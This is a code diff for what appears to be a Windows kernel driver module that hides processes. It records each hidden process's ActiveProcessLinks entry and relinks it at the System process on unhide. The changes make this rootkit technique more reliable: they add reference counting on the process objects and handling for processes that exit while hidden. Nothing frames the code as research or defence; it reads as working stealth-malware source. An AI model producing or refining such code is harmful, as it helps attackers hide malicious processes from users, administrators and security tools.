@@ -1,9 +1,10 @@
-#include <ntddk.h>
 #include "ProcessModule.h"
 #include "Offsets.h"
+#include <ntddk.h>
 
 NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId,
                                                 PEPROCESS *Process);
+NTKERNELAPI NTSTATUS PsGetProcessExitStatus(PEPROCESS Process);
 
 //
 // Registry of hidden processes. Each entry keeps the original
@@ -12,6 +13,7 @@ NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId,
 typedef struct _HIDDEN_PROCESS_ENTRY {
   ULONG ProcessId;
   PLIST_ENTRY OriginalLinks;
+  PEPROCESS ProcessObject;
 } HIDDEN_PROCESS_ENTRY, *PHIDDEN_PROCESS_ENTRY;
 
 static HIDDEN_PROCESS_ENTRY g_HiddenProcesses[MAX_HIDDEN_PROCESSES];
@@ -42,7 +44,8 @@ static BOOLEAN IsProcessHidden(ULONG ProcessId) {
   return found;
 }
 
-static BOOLEAN AddHiddenProcess(ULONG ProcessId, PLIST_ENTRY OriginalLinks) {
+static BOOLEAN AddHiddenProcess(ULONG ProcessId, PLIST_ENTRY OriginalLinks,
+                                PEPROCESS ProcessObject) {
   BOOLEAN success = FALSE;
 
   ExAcquireFastMutex(&g_HiddenListLock);
@@ -55,6 +58,7 @@ static BOOLEAN AddHiddenProcess(ULONG ProcessId, PLIST_ENTRY OriginalLinks) {
 
   g_HiddenProcesses[g_HiddenProcessCount].ProcessId = ProcessId;
   g_HiddenProcesses[g_HiddenProcessCount].OriginalLinks = OriginalLinks;
+  g_HiddenProcesses[g_HiddenProcessCount].ProcessObject = ProcessObject;
   g_HiddenProcessCount++;
   success = TRUE;
 
@@ -98,10 +102,18 @@ NTSTATUS ProcessModuleInitialize(VOID) {
   return STATUS_SUCCESS;
 }
 
-//  clears the hidden-process registry.
+//  clears the hidden-process registry and drops any held references.
 
 VOID ProcessModuleCleanup(VOID) {
+  ULONG i;
+
   ExAcquireFastMutex(&g_HiddenListLock);
+  for (i = 0; i < g_HiddenProcessCount; i++) {
+    if (g_HiddenProcesses[i].ProcessObject) {
+      ObDereferenceObject(g_HiddenProcesses[i].ProcessObject);
+      g_HiddenProcesses[i].ProcessObject = NULL;
+    }
+  }
   g_HiddenProcessCount = 0;
   ExReleaseFastMutex(&g_HiddenListLock);
 
@@ -129,10 +141,16 @@ NTSTATUS ProcessHide(ULONG ProcessId) {
   if (!NT_SUCCESS(status))
     return status;
 
+  // Do not hide a process that is already terminating.
+  if (PsGetProcessExitStatus(targetProcess) != STATUS_PENDING) {
+    ObDereferenceObject(targetProcess);
+    return STATUS_PROCESS_IS_TERMINATING;
+  }
+
   PLIST_ENTRY processListEntry =
       (PLIST_ENTRY)((PUCHAR)targetProcess + activeLinksOffset);
 
-  if (!AddHiddenProcess(ProcessId, processListEntry)) {
+  if (!AddHiddenProcess(ProcessId, processListEntry, targetProcess)) {
     ObDereferenceObject(targetProcess);
     return STATUS_INSUFFICIENT_RESOURCES;
   }
@@ -151,17 +169,17 @@ NTSTATUS ProcessHide(ULONG ProcessId) {
     return status;
   }
 
-  ObDereferenceObject(targetProcess);
-
   DbgPrint("Hidden process %lu.\n", ProcessId);
   return STATUS_SUCCESS;
 }
 
 //  ProcessUnhide re-links a previously hidden process back into the active
-//  process list
+//  process list if it is still alive
 NTSTATUS ProcessUnhide(ULONG ProcessId) {
   NTSTATUS status = STATUS_SUCCESS;
   PEPROCESS systemProcess = NULL;
+  PEPROCESS targetProcess = NULL;
+  PLIST_ENTRY originalLinks = NULL;
   ULONG activeLinksOffset = GetActiveProcessLinksOffset();
   ULONG i;
 
@@ -171,39 +189,46 @@ NTSTATUS ProcessUnhide(ULONG ProcessId) {
   if (activeLinksOffset == 0)
     return STATUS_UNSUCCESSFUL;
 
-  // Resolve the saved list node for the given PID.
-  PLIST_ENTRY originalLinks = NULL;
+  // Resolve the saved list node and process object for the given PID.
   ExAcquireFastMutex(&g_HiddenListLock);
   for (i = 0; i < g_HiddenProcessCount; i++) {
     if (g_HiddenProcesses[i].ProcessId == ProcessId) {
       originalLinks = g_HiddenProcesses[i].OriginalLinks;
+      targetProcess = g_HiddenProcesses[i].ProcessObject;
       break;
     }
   }
   ExReleaseFastMutex(&g_HiddenListLock);
 
-  if (!originalLinks)
+  if (!originalLinks || !targetProcess)
     return STATUS_NOT_FOUND;
 
-  // Anchor the insert at the System process, the head of the active list.
-  status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID),
-                                      &systemProcess);
-  if (!NT_SUCCESS(status))
-    return status;
+  // Check if the process exited while it was hidden.
+  BOOLEAN isDead = (PsGetProcessExitStatus(targetProcess) != STATUS_PENDING);
 
-  PLIST_ENTRY processListEntry =
-      (PLIST_ENTRY)((PUCHAR)systemProcess + activeLinksOffset);
+  if (!isDead) {
+    // Only re-link active processes back into the active process list!
+    status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID),
+                                        &systemProcess);
+    if (NT_SUCCESS(status)) {
+      PLIST_ENTRY processListEntry =
+          (PLIST_ENTRY)((PUCHAR)systemProcess + activeLinksOffset);
 
-  __try {
-    InsertHeadList(processListEntry, originalLinks);
-  } __except (EXCEPTION_EXECUTE_HANDLER) {
-    status = GetExceptionCode();
-    ObDereferenceObject(systemProcess);
-    DbgPrint("Unhide process %lu faulted: 0x%X\n", ProcessId, status);
-    return status;
+      __try {
+        InsertHeadList(processListEntry, originalLinks);
+      } __except (EXCEPTION_EXECUTE_HANDLER) {
+        status = GetExceptionCode();
+        DbgPrint("Unhide process %lu faulted: 0x%X\n", ProcessId, status);
+      }
+
+      ObDereferenceObject(systemProcess);
+    }
+  } else {
+    DbgPrint("Process %lu terminated while hidden.\n", ProcessId);
   }
 
-  ObDereferenceObject(systemProcess);
+  // Release the reference held since ProcessHide
+  ObDereferenceObject(targetProcess);
 
   RemoveHiddenProcess(ProcessId);
 
